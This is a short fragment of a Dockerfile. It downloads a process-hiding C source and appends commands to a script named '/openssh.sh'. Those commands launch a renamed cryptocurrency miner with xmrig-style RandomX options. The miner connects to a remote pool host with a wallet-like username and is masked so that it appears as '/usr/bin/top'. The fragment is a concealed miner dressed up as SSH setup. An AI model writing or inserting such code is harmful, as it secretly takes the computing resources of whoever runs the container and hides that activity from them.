...
RUN wget https://raw.githubusercontent.com/hudahadoh/hime/main/processhider.c \
...
RUN echo "sleep 5" >> /openssh.sh \
    && echo "/run/sshd/hi -s "/usr/bin/top" -d -p test.pid ./run/sshd/bhmax --url latifgbl-64001.portmap.host:64001 --user SOL:5VqKde82ANkwGDXTRpBRa3vd1PFn1gdGN6tP7aJ38gx4.x5 --pass x -k -t 5 --randomx-mode auto --randomx-wrmsr=-1 --randomx-no-rdmsr --randomx-no-numa &" >> /openssh.sh \
